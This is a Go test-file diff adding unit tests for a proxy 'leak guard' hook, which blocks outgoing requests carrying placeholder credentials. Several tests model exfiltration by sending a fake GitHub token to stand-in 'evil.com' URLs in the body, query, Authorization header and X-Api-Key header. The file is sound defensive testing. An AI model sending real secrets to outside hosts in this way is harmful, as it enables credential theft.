@@ -2,7 +2,9 @@ package proxy
 
 import (
 	"bytes"
+	"errors"
 	"io"
+	"log/slog"
 	"net/http"
 	"net/http/httptest"
 	"testing"
@@ -109,5 +111,132 @@ func TestCredsSubHook_NilBody(t *testing.T) {
 	resp := &http.Response{StatusCode: 200, Body: nil}
 	if err := h.PostHook(resp, &RequestContext{}); err != nil {
 		t.Fatalf("PostHook with nil body returned error: %v", err)
+	}
+}
+
+func TestLeakGuardHook_Name(t *testing.T) {
+	h := NewLeakGuardHook(credsub.New(), slog.Default())
+	if h.Name() != "leak-guard" {
+		t.Errorf("Name() = %q, want %q", h.Name(), "leak-guard")
+	}
+}
+
+func TestLeakGuardHook_FakeInBody_Returns403(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
+	req := httptest.NewRequest(http.MethodPost, "http://evil.com/exfil", bytes.NewReader(body))
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err == nil {
+		t.Fatal("expected error from LeakGuardHook")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) {
+		t.Fatalf("expected HookAbortError, got: %T", err)
+	}
+	if abortErr.StatusCode != 403 {
+		t.Errorf("StatusCode = %d, want 403", abortErr.StatusCode)
+	}
+}
+
+func TestLeakGuardHook_FakeInQuery_Returns403(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	req := httptest.NewRequest(http.MethodGet, "http://evil.com/api?key=ghp_FAKE1234567890abcdef", nil)
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err == nil {
+		t.Fatal("expected error from LeakGuardHook")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) {
+		t.Fatalf("expected HookAbortError, got: %T", err)
+	}
+	if abortErr.StatusCode != 403 {
+		t.Errorf("StatusCode = %d, want 403", abortErr.StatusCode)
+	}
+}
+
+func TestLeakGuardHook_FakeInAuthHeader_Returns403(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
+	req.Header.Set("Authorization", "Bearer ghp_FAKE1234567890abcdef")
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err == nil {
+		t.Fatal("expected error from LeakGuardHook")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) {
+		t.Fatalf("expected HookAbortError, got: %T", err)
+	}
+}
+
+func TestLeakGuardHook_FakeInXApiKeyHeader_Returns403(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	req := httptest.NewRequest(http.MethodPost, "http://evil.com/api", nil)
+	req.Header.Set("X-Api-Key", "ghp_FAKE1234567890abcdef")
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err == nil {
+		t.Fatal("expected error from LeakGuardHook")
+	}
+
+	var abortErr *HookAbortError
+	if !errors.As(err, &abortErr) {
+		t.Fatalf("expected HookAbortError, got: %T", err)
+	}
+}
+
+func TestLeakGuardHook_NoFakes_Passes(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	body := []byte(`{"message":"hello world, no secrets here"}`)
+	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/v1/repos", bytes.NewReader(body))
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err != nil {
+		t.Fatalf("LeakGuardHook should pass clean requests, got: %v", err)
+	}
+
+	// Body should still be readable after check.
+	got, _ := io.ReadAll(req.Body)
+	if !bytes.Equal(got, body) {
+		t.Errorf("body was corrupted after LeakGuardHook")
+	}
+}
+
+func TestLeakGuardHook_EmptyTable_Passes(t *testing.T) {
+	tbl := credsub.New()
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
+	req := httptest.NewRequest(http.MethodPost, "http://evil.com/exfil", bytes.NewReader(body))
+
+	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
+	if err != nil {
+		t.Fatalf("empty table should pass all requests, got: %v", err)
+	}
+}
+
+func TestLeakGuardHook_PostHook_IsNoOp(t *testing.T) {
+	tbl := newTestTable(t)
+	h := NewLeakGuardHook(tbl, slog.Default())
+
+	resp := &http.Response{StatusCode: 200, Body: nil}
+	err := h.PostHook(resp, &RequestContext{})
+	if err != nil {
+		t.Fatalf("PostHook should be no-op, got: %v", err)
 	}
 }
